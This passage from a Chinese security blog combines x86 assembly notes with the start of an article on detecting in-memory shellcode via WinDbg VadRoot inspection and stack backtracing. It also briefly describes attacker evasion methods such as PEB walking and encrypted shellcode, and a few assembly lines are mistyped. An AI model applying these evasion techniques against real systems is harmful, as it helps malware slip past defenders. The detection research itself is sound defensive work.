<p>32位</p>
<p>EAX：累加器，<strong>返回函数结果</strong></p>
<p>ECX：<strong>字符串</strong>和循环操作数的计数器</p>
<p>EDX：（I&#x2F;O指针）数据寄存器</p>
<p>EBX：（DS段中的数据指针）寄存器</p>
<p>ESP：（SS段中的栈指针）栈指针寄存器</p>
<p>EBP：（SS段中的站内数据指针）扩展机制指针寄存器</p>
<p>ESI：（字符串操作源指针）源变址寄存器</p>
<p>对于汇编来说，只能用规定的语句：比如，两块内存之间就没有办法直接操作，得通过寄存器中转</p>
<h3 id="内存寻址"><a href="#内存寻址" class="headerlink" title="内存寻址"></a>内存寻址</h3><p>寄存器位于CPU内部，执行速度快，内存速度相对较慢，但是空间很大，寄存器和内存没有本质区别，都是用于存储数据的容器，都是定宽的</p>
<p>常用的寄存器我们之前已经提到过了</p>
<p>计算机中有几个常用的计量单位 BYTE WORD DWORD QWORD</p>
<p>BYTE 字节 &#x3D; 8 bit</p>
<p>WORD 字 &#x3D; 16bit</p>
<p>DWORD 双字 &#x3D; 32 bit</p>
<p>QWORD 四字 &#x3D; 64bit</p>
<p>向指定内存写入数据 ds：data segment register，即数据段寄存器 ptr：表示后面是一个指针</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov dword ptr ds:[<span class="number">0x19FF84</span>],<span class="number">0x12345678</span></span><br><span class="line">mov eax,dword ptr ds:[<span class="number">0x19FF88</span>]</span><br></pre></td></tr></table></figure>

<p><strong>lea指令：取地址指令</strong></p>
<p><strong>立即数寻址</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mov eax,dword ptr ds:[<span class="number">0x19FF84</span>]</span><br><span class="line">mov ebx,dword ptr ds:[<span class="number">0x19FF88</span>]</span><br><span class="line">mov dword ptr ds:[<span class="number">0x19FF84</span>],eax</span><br><span class="line">mov dword ptr ds:[<span class="number">0x19FF88</span>],ebx</span><br><span class="line">lea eax,dword ptr ds:[<span class="number">0x19FF84</span>]</span><br><span class="line">lea eax,dword ptr ds:[ESP<span class="number">+8</span>]</span><br></pre></td></tr></table></figure>

<p><strong>通用寄存器寻址</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV ECX,<span class="number">0x19FF84</span></span><br><span class="line">MOV EAX,DWORD PTR DS:[ECX]</span><br><span class="line">MOV EDX,<span class="number">0x13FFD8</span></span><br><span class="line">MOV DWORD PTR DS:[EDX],<span class="number">0x87654321</span></span><br><span class="line">LEA EAX,DWORD PTR DS:[EDX]</span><br><span class="line">MOV EAX,DWORD PTR DS:[EDX]</span><br></pre></td></tr></table></figure>

<p><strong>立即数+寄存器</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">MOV ECX,<span class="number">0x13FFD0</span></span><br><span class="line">MOV EAX,DWORD PTR DS:[ECX<span class="number">+4</span>]</span><br><span class="line">MOV EDX,<span class="number">0x13FFD8</span></span><br><span class="line">MOV DWORD PTR DS:[EDX<span class="number">+0xC</span>],<span class="number">0x87654321</span></span><br><span class="line">LEA EAX,DWORD PTR DS:[EDX<span class="number">+4</span>]</span><br><span class="line">MOV EAX,DWORD PTR DS:[EDX<span class="number">+4</span>]</span><br></pre></td></tr></table></figure>

<p><strong>使用通用寄存器+通用寄存器*1&#x2F;2&#x2F;4&#x2F;8+立即数</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">MOV EAX,<span class="number">13</span>FFC4</span><br><span class="line">MOV ECX,<span class="number">2</span></span><br><span class="line">MOV EDX,DWORD PTR DS:[EAX+ECX4<span class="number">+4</span>]</span><br><span class="line">MOV EAX,<span class="number">13</span>FFC4</span><br><span class="line">MOV ECX,<span class="number">2</span></span><br><span class="line">MOV DWORD PTR DS:[EAX+ECX4<span class="number">+4</span>],<span class="number">87654321</span></span><br><span class="line">LEA EAX,DWORD PTR DS:[EAX+ECX*<span class="number">4</span><span class="number">+2</span>]</span><br></pre></td></tr></table></figure>



<h2 id="标志寄存器"><a href="#标志寄存器" class="headerlink" title="标志寄存器"></a>标志寄存器</h2><p>x86架构CPU中，标志寄存器主要有3种作用： <strong>存储相关指令执行后的结果</strong>，例如CF、PF、AF、ZF、OF标志位, <strong>执行相关指令时，提供行为依据</strong>，例如执行 JE 指令时会读取ZF的值，来决定是否进行跳转。 <strong>控制CPU的工作方</strong>式，例如IF、VM、TF等标志位。</p>
<p>16位模式下，标志寄存器名称为 FLAG ，寄存器大小16位。 32位模式下，标志寄存器的名称为 EFLAG ，寄存器大小32位。 64位模式下，标志寄存器的名称为 RFLAG ，寄存器大小64位。</p>
<h2 id="堆栈"><a href="#堆栈" class="headerlink" title="堆栈"></a>堆栈</h2><p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240923235031084.png" alt="image-20240923235031084"></p>
<h2 id="JCC语句"><a href="#JCC语句" class="headerlink" title="JCC语句"></a>JCC语句</h2><h3 id="jmp"><a href="#jmp" class="headerlink" title="jmp"></a>jmp</h3><p>跳转到指定地址：<strong>e9</strong> <strong>不涉及堆栈变化</strong> （不修改ebp&amp;esp）</p>
<p><strong>本质：修改EIP</strong></p>
<h3 id="call"><a href="#call" class="headerlink" title="call"></a>call</h3><p> 跳转到<strong>指定地址并运行到当前指令的下一行</strong></p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">e8:就近跳转</span><br><span class="line">ff <span class="number">15</span>:远跳转 无限地址</span><br></pre></td></tr></table></figure>

<p>esp提升4字节(-) 将返回地址压入堆栈</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call <span class="number">0x19FFD0</span> -&gt; push <span class="number">0x19FFD4</span> / mov eip,<span class="number">0x19FFD0</span></span><br></pre></td></tr></table></figure>

<h3 id="ret"><a href="#ret" class="headerlink" title="ret"></a>ret</h3><p>返回到指定地址</p>
<p>esp降低4字节(+) 从堆栈里面取出返回地址传给eip</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ret -&gt; lea esp, [esp+<span class="number">4</span>] / mov eip,[esp<span class="number">-4</span>]</span><br></pre></td></tr></table></figure>

<h3 id="cmp"><a href="#cmp" class="headerlink" title="cmp"></a>cmp</h3><p>比较两个操作数是否相等</p>
<p>主要是一个相减的操作</p>
<h3 id="test"><a href="#test" class="headerlink" title="test"></a>test</h3><p>对两个数进行相与操作</p>
<p>用来判断寄存器的值是否为0</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">test eax,eax</span><br></pre></td></tr></table></figure>


      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2024/10/08/%E5%85%8D%E6%9D%80/%E6%B1%87%E7%BC%96/" data-id="cm1zwlrfq000eu0v65yht9238" data-title="" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-免杀/内存加载检测" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2024/10/08/%E5%85%8D%E6%9D%80/%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BD%E6%A3%80%E6%B5%8B/" class="article-date">
  <time class="dt-published" datetime="2024-10-08T03:50:54.564Z" itemprop="datePublished">2024-10-08</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="内存加载检测"><a href="#内存加载检测" class="headerlink" title="内存加载检测"></a>内存加载检测</h1><h2 id="vadroot"><a href="#vadroot" class="headerlink" title="vadroot"></a>vadroot</h2><p>在0环中，我们可以从VadRoot这个结构中看见内存分配</p>
<h3 id="64位"><a href="#64位" class="headerlink" title="64位"></a>64位</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">+0x650 CommitChargePeak : Uint8B</span><br><span class="line"> +0x680 Vm               : _MMSUPPORT_FULL</span><br><span class="line"> +0x7c0 MmProcessLinks   : _LIST_ENTRY</span><br><span class="line"> +0x7d0 ModifiedPageCount : Uint4B</span><br><span class="line"> +0x7d4 ExitStatus       : Int4B</span><br><span class="line"> +0x7d8 VadRoot          : _RTL_AVL_TREE//////这里</span><br><span class="line"> +0x7e0 VadHint          : Ptr64 Void</span><br><span class="line"> +0x7e8 VadCount         : Uint8B</span><br><span class="line"> +0x7f0 VadPhysicalPages : Uint8B</span><br><span class="line"> +0x7f8 VadPhysicalPagesLimit : Uint8B</span><br><span class="line"> +0x800 AlpcContext      : _ALPC_PROCESS_CON</span><br></pre></td></tr></table></figure>

<p>获取每个进程的EPROCESS</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt;  !process <span class="number">0</span> <span class="number">0</span></span><br><span class="line">**** NT ACTIVE PROCESS DUMP ****</span><br><span class="line">PROCESS ffffcc8f17483080</span><br><span class="line">    SessionId: none  Cid: <span class="number">0004</span>    Peb: <span class="number">00000000</span>  ParentCid: <span class="number">0000</span></span><br><span class="line">    DirBase: <span class="number">001</span>ad002  ObjectTable: ffffa08ace208e40  HandleCount: <span class="number">2537.</span></span><br><span class="line">    Image: System</span><br><span class="line"></span><br><span class="line">PROCESS ffffcc8f174e8080</span><br><span class="line">    SessionId: none  Cid: <span class="number">006</span>c    Peb: <span class="number">00000000</span>  ParentCid: <span class="number">0004</span></span><br><span class="line">    DirBase: <span class="number">00346002</span>  ObjectTable: ffffa08ace226380  HandleCount:   <span class="number">0.</span></span><br><span class="line">    Image: Registry</span><br><span class="line"></span><br><span class="line">PROCESS ffffcc8f180f7040</span><br><span class="line">    SessionId: none  Cid: <span class="number">0150</span>    Peb: <span class="number">40</span>dc1e0000  ParentCid: <span class="number">0004</span></span><br><span class="line">    DirBase: <span class="number">0e9</span>e5002  ObjectTable: ffffa08ace82e080  HandleCount:  <span class="number">53.</span></span><br><span class="line">    Image: smss.exe</span><br><span class="line"></span><br><span class="line">PROCESS ffffcc8f1825d080</span><br><span class="line">    SessionId: <span class="number">0</span>  Cid: <span class="number">01b</span>c    Peb: <span class="number">5515</span>c5d000  ParentCid: <span class="number">01b</span>4</span><br><span class="line">    DirBase: <span class="number">230</span>d71002  ObjectTable: ffffa08ad18f04c0  HandleCount: <span class="number">502.</span></span><br><span class="line">    Image: csrss.exe</span><br><span class="line"></span><br><span class="line">。。。。。。。。。。</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里PROCESS的值就是EPROCESS的头指针,我们可以看见进程名和VadRoot的偏移，在<strong>0x7d8</strong></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; dt _EPROCESS ffffcc8f17483080</span><br><span class="line">nt!_EPROCESS</span><br><span class="line">  ................................</span><br><span class="line">   +0x580 WoW64Process     : (null) </span><br><span class="line">   +0x588 DeviceMap        : 0xffffa08a`ce237c00 Void</span><br><span class="line">   +0x590 EtwDataSource    : (null) </span><br><span class="line">   +0x598 PageDirectoryPte : 0</span><br><span class="line">   +0x5a0 ImageFilePointer : (null) </span><br><span class="line">   +0x5a8 ImageFileName    : [15]  &quot;System&quot;</span><br><span class="line">   +0x5b7 PriorityClass    : 0x2 &#x27;&#x27;</span><br><span class="line">   +0x5b8 SecurityPort     : (null) </span><br><span class="line">................................................</span><br><span class="line">   +0x7d0 ModifiedPageCount : 0xeb7</span><br><span class="line">   +0x7d4 ExitStatus       : 0n259</span><br><span class="line">   +0x7d8 VadRoot          : _RTL_AVL_TREE</span><br><span class="line">   +0x7e0 VadHint          : 0xffffcc8f`17475600 Void</span><br><span class="line">   +0x7e8 VadCount         : 6</span><br><span class="line">   +0x7f0 VadPhysicalPages : 0</span><br><span class="line">   +0x7f8 VadPhysicalPagesLimit : 0</span><br></pre></td></tr></table></figure>

<p>继续按照偏移找到vadroot中的信息</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">0: kd&gt; !vad ffffcc8f17483080+0x7d8</span><br><span class="line">VAD             Level         Start             End              Commit</span><br><span class="line">ffffcc8f19cd4520  3           77770           77913               9 Mapped  Exe  EXECUTE_WRITECOPY  \Windows\SysWOW64\ntdll.dll</span><br><span class="line">ffffcc8f174756f0  2           7ffe0           7ffe0               1 Private      READONLY           </span><br><span class="line">ffffcc8f17475600  1           7ffe7           7ffe7               1 Private      READONLY           </span><br><span class="line">ffffcc8f19ceb400  3        1c52e3e0        1c52e3e0               0 Mapped       READWRITE          Pagefile section, shared commit 0x1</span><br><span class="line">ffffcc8f19cd47a0  2       7fffa8710       7fffa8741               9 Mapped  Exe  EXECUTE_WRITECOPY  \Windows\System32\vertdll.dll</span><br><span class="line">ffffcc8f19cd5880  3       7fffa8750       7fffa8947              16 Mapped  Exe  EXECUTE_WRITECOPY  \Windows\System32\ntdll.dll</span><br><span class="line"></span><br><span class="line">Total VADs: 6, average level: 3, maximum depth: 3</span><br><span class="line">Total private commit: 0x24 pages (144 KB)</span><br><span class="line">Total shared commit:  0x1 pages (4 KB)</span><br></pre></td></tr></table></figure>

<p>我们可以看见，在这个名为system的进程中，我们可以看见内存分配的范围，是Mapped还是Private，以及内存的权限等等信息</p>
<h2 id="Mapped和Private"><a href="#Mapped和Private" class="headerlink" title="Mapped和Private"></a>Mapped和Private</h2><p>在Windows的内存，只有两种属性，一种Private，一种Mapped</p>
<p>主要有两点不同：</p>
<p><strong>申请内存的方式不同</strong> 私有内存：通过 VirtualAlloc&#x2F;VirtualAllocEx 申请的 映射内存：通过 CreateFileMapping 映射的</p>
<p><strong>使用方式不同</strong> 私有内存：独享物理页 映射内存：可能要与其它进程共享物理页</p>
<p>有 VirtualAlloc 和 CreateFileMapping 这两个函数申请的内存，称为私有内存和映射内存</p>
<p>在C语言中使用 malloc 和在C++中使用 new 分配的堆空间并不是真正的内存，它们本身没有进入0环去申请内存空间，而是<strong>通过在操作系统一开始用 VirtualAlloc 已经分配好的一大块空间里面取一块</strong></p>
<p>下面是两个函数的调用链</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">**<span class="built_in">malloc</span> -&gt; _nh_malloc_dbg -&gt; _heap_alloc_dbg -&gt; _heap_alloc_base -&gt; HeapAlloc**</span><br><span class="line"></span><br><span class="line">**new -&gt; _nh_malloc -&gt; _nh_malloc_dbg -&gt; _heap_alloc_dbg -&gt; _heap_alloc_base -&gt; HeapAlloc**</span><br></pre></td></tr></table></figure>

<p>无论是全局变量，局部变量，或者调用 malloc 函数，它都没有分配新的内存空间，<strong>只不过是使用了当 前进程已有的内存空间</strong></p>
<p><strong>32位的Vadroot结构类似，并且更加简单，这里就不再赘述了</strong></p>
<h2 id="检测shellcode驱动实现"><a href="#检测shellcode驱动实现" class="headerlink" title="检测shellcode驱动实现"></a>检测shellcode驱动实现</h2><p>单就shellcode的检测来说，shellcode加载到内存中一般通过LoadLibrary和GetProcessAddress来获取函数进行shellcode加载，</p>
<p>为了隐蔽，攻击者通常会通过PEB找到 InLoadOrderModuleList 链表，自己去定位 LoadLibrary 函数从而规避杀软对导入表的监控。攻击者先把shellcode加密，在写入时解密存放到内存空间，使用基于文件检测的方法，是无能为力的，那么这种<strong>无落地</strong>的方式，最终都会在内存中一览无余</p>
<p>先随便注入一个dll为例</p>
<p><img src="C:\Users\su\AppData\Roaming\Typora\typora-user-images\image-20240927094857471.png" alt="image-20240927094857471"></p>
<p>这时候打开windbg，去查看notepad.exe这个进程</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">2</span>: kd&gt; !process <span class="number">0</span> <span class="number">0</span> notepad.exe</span><br><span class="line">PROCESS ffffcc8f1e87f340</span><br><span class="line">    SessionId: <span class="number">1</span>  Cid: <span class="number">2170</span>    Peb: <span class="number">90839</span>cd000  ParentCid: <span class="number">1404</span></span><br><span class="line">    DirBase: <span class="number">12e575002</span>  ObjectTable: ffffa08ad35b55c0  HandleCount: <span class="number">245.</span></span><br><span class="line">    Image: notepad.exe</span><br></pre></td></tr></table></figure>

<p>转到进程的vadroot,在一众从System32里面加载出来的dll中，我们所注入的Dll_inject.dll非常的显眼，而且它也申请了写拷贝权限，这些在内存里面一览无余</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2: kd&gt; !vad ffffcc8f1e87f340+0x7d8</span><br><span class="line">VAD             Level         Start             End              Commit</span><br><span class="line">.........................................................</span><br><span class="line"></span><br><span class="line">ffffcc8f1e4a0140  6       7fff8f090       7fff8f329               8 Mapped  Exe  EXECUTE_WRITECOPY  \Windows\WinSxS\amd64_microsoft.windows.common-controls_6595b64144ccf1df_6.0.19041.4355_none_60b8b9eb71f62e16\comctl32.dll</span><br><span class="line">ffffcc8f1dc9e120  5       7fff93450       7fff9352d               5 Mapped  Exe  EXECUTE_WRITECOPY  \Windows\System32\efswrt.dll</span><br><span class="line">ffffcc8f1e49f2e0  7       7fff943c0       7fff943c6               2 Mapped  Exe  EXECUTE_WRITECOPY  \Users\su\Desktop\Dll_inject.dll</span><br><span class="line">ffffcc8f1dc9e800  6       7fff96e90       7fff96eac               3 Mapped  Exe  EXECUTE_WRITECOPY  \Windows\System32\mpr.dll</span><br><span class="line">ffffcc8f1dc9e1c0  3       7fff97e40       7fff97eeb               2 Mapped  Exe  EXECUTE_WRITECOPY  </span><br><span class="line">....................................</span><br><span class="line">Total VADs: 100, average level: 6, maximum depth: 8</span><br><span class="line">Total private commit: 0x25c pages (2416 KB)</span><br><span class="line">Total shared commit:  0x1fcd pages (32564 KB)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="堆栈回溯"><a href="#堆栈回溯" class="headerlink" title="堆栈回溯"></a>堆栈回溯</h3><p>根据上面我们的发现，如果想要检测不落地的shellcode注入，那么肯定要重点盯防vad树种的private内存，特别是权限为READWRITE_EXECUTE或者写拷贝的内存</p>
<p>这里我们就需要用到堆栈回溯，简单来说就是<strong>查看ebp和esp来确认堆栈的起始位置和结束位置</strong></p>
<h3 id="EBP"><a href="#EBP" class="headerlink" title="EBP"></a>EBP</h3><p>堆栈就是利用 EBP 寄存器访问栈内部局部变量、参数、函数返回地址等的手段。程序运行 中， ESP 寄存器的值随时变化，访问栈中函数的局部变量、参数时，<strong>若以 ESP 值为基准编写程序会十分 困难</strong>，并且也很难使 CPU 引用到正确的地址</p>
<p>所以，调用某函数时，先要把用作基准点（函数起始地址）的 ESP 值保存到 EBP ，并维持在函数内 部。这样，<strong>无论 ESP 的值如何变化，以 EBP 的值为基准能够安全访问到相关函数的局部变量、参数、 返回地址，</strong>这就是 EBP 寄存器作为堆栈指针的作用</p>
<p>所以我们的思路就是，逐级向上遍历调用函数的EBP</p>
<h3 id="栈信息的获取"><a href="#栈信息的获取" class="headerlink" title="栈信息的获取"></a>栈信息的获取</h3><p>这里经过查阅资料后发现<strong>栈信息的获取</strong>可以通过 RtlWalkFrameChain 这个函数实现，代码如下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ULONG RtlWalkFrameChain(OUT PVOID *Callers, IN ULONG Count, IN ULONG Flags)</span><br></pre></td></tr></table></figure>

<p>第一个参数 Callers 是一个数组，保存栈中 retaddr 值，第二个参数 Count 表示数组大小，第三个参 数 Flags&#x3D;0 则获取内核层栈信息， Flags&#x3D;1 则获取应用层栈信息</p>
<p>在得到 EBP 内容之后，<strong>我们需要计算当前内核栈的范围，这是因为我们在计算数据时不能跑出一个范 围，否则会有蓝屏的危险</strong>。栈的开始地址就设置为 EBP 指针指向的地址，而终止范围是比较难确定的， 这个地址可以使用</p>
<p>StackLimit 和StackBase。</p>
<h3 id="StackLimit-和StackBase"><a href="#StackLimit-和StackBase" class="headerlink" title="StackLimit 和StackBase"></a>StackLimit 和StackBase</h3><p>我们可以看见TEB结构里面有_NT_TIB</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">2: kd&gt; dt _TEB</span><br><span class="line">nt!_TEB</span><br><span class="line">   +0x000 NtTib            : _NT_TIB</span><br><span class="line">   +0x038 EnvironmentPointer : Ptr64 Void</span><br><span class="line">   +0x040 ClientId         : _CLIENT_ID</span><br><span class="line">   +0x050 ActiveRpcHandle  : Ptr64 Void</span><br><span class="line">   +0x058 ThreadLocalStoragePointer : Ptr64 Void</span><br><span class="line">   +0x060 ProcessEnvironmentBlock : Ptr64 _PEB</span><br><span class="line">   +0x068 LastErrorValue   : Uint4B</span><br><span class="line">   +0x06c CountOfOwnedCriticalSections : Uint4B</span><br><span class="line">   +0x070 CsrClientThread  : Ptr64 Void</span><br><span class="line">   +0x078 Win32ThreadInfo  : Ptr64 Void</span><br><span class="line">   +0x080 User32Reserved   : [26] Uint4B</span><br><span class="line">  ...................................</span><br></pre></td></tr></table></figure>

<p>进去继续看，可以看见StackLimit 和StackBase。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">2: kd&gt; dt _NT_TIB</span><br><span class="line">nt!_NT_TIB</span><br><span class="line">   +0x000 ExceptionList    : Ptr64 _EXCEPTION_REGISTRATION_RECORD</span><br><span class="line">   +0x008 StackBase        : Ptr64 Void</span><br><span class="line">   +0x010 StackLimit       : Ptr64 Void</span><br><span class="line">   +0x018 SubSystemTib     : Ptr64 Void</span><br><span class="line">   +0x020 FiberData        : Ptr64 Void</span><br><span class="line">   +0x020 Version          : Uint4B</span><br><span class="line">   +0x028 ArbitraryUserPointer : Ptr64 Void</span><br><span class="line">   +0x030 Self             : Ptr64 _NT_TIB</span><br></pre></td></tr></table></figure>

<p>根据规定，所属每个函数调用的 EBP 和 ESP 寄存器所划定的空间，应该始终在当前线程的 StackLimit 到 StackBase 的范围之间存在</p>
<h3 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h3><p>在知道了堆栈回溯之后，可以进行代码的编写，之前分析过shellcode会通过VirualAllc这种函数去申请private内存</p>
<p>所以就可以用ZwQueryVirtualMemory这个API来确定虚拟空间的状态保护和类型，结构如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">NTSYSAPI NTSTATUS <span class="title function_">ZwQueryVirtualMemory</span><span class="params">(</span></span><br><span class="line"><span class="params">[in] HANDLE ProcessHandle,</span></span><br><span class="line"><span class="params">[in, optional] PVOID BaseAddress,</span></span><br><span class="line"><span class="params">[in] MEMORY_INFORMATION_CLASS MemoryInformationClass,</span></span><br><span class="line"><span class="params">[out] PVOID MemoryInformation,</span></span><br><span class="line"><span class="params">[in] SIZE_T MemoryInformationLength,</span></span><br><span class="line"><span class="params">[out, optional] PSIZE_T ReturnLength</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>

<p>这个函数的几个参数分别是</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">[in] ProcessHandle</span><br><span class="line"></span><br><span class="line">要查询的页面所在的上下文的进程句柄。 使用 ZwCurrentProcess 宏指定当前进程。</span><br><span class="line"></span><br><span class="line">[in, optional] BaseAddress</span><br><span class="line"></span><br><span class="line">要查询的页区域的基址。 此值向下舍入到下一个主机页地址边界。</span><br><span class="line"></span><br><span class="line">[in] MemoryInformationClass</span><br><span class="line"></span><br><span class="line">要检索其相关信息的内存信息类。 目前，唯一受支持的 MEMORY_INFORMATION_CLASS 值为 MemoryBasicInformation。</span><br><span class="line"></span><br><span class="line">[out] MemoryInformation</span><br><span class="line"></span><br><span class="line">指向接收指定信息的缓冲区的指针。 缓冲区的格式和内容取决于 MemoryInformationClass 参数中指定的指定信息类。 当 MemoryBasicInformation 值传递到 MemoryInformationClass 时， MemoryInformation 参数值是 MEMORY_BASIC_INFORMATION 结构。</span><br><span class="line"></span><br><span class="line">[in] MemoryInformationLength</span><br><span class="line"></span><br><span class="line">指定内存信息缓冲区的长度（以字节为单位）。</span><br><span class="line"></span><br><span class="line">[out, optional] ReturnLength</span><br><span class="line"></span><br><span class="line">一个可选指针，如果指定，则接收放置在内存信息缓冲区中的字节数。</span><br></pre></td></tr></table></figure>

<p>这里首先注意第三个参数<strong>MemoryInformationClass 只能设置为 MemoryBasicInformation</strong>，第四个参数指向 <strong>MEMORY_BASIC_INFORMATION</strong> 结构。</p>
<p>这里我们首先定义<strong>MEMORY_BASIC_INFORMATION</strong>,这个微软给过官方定义</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">MEMORY_BASIC_INFORMATION</span> &#123;</span></span><br><span class="line">  PVOID  BaseAddress;</span><br><span class="line">  PVOID  AllocationBase;</span><br><span class="line">  DWORD  AllocationProtect;</span><br><span class="line"> <span class="meta">#<span class="keyword">if</span> defined(_WIN64)</span></span><br><span class="line">  WORD   PartitionId;</span><br><span class="line"> <span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">  SIZE_T RegionSize;</span><br><span class="line">  DWORD  State;</span><br><span class="line">  DWORD  Protect;</span><br><span class="line">  DWORD  Type;</span><br><span class="line">&#125; MEMORY_BASIC_INFORMATION, 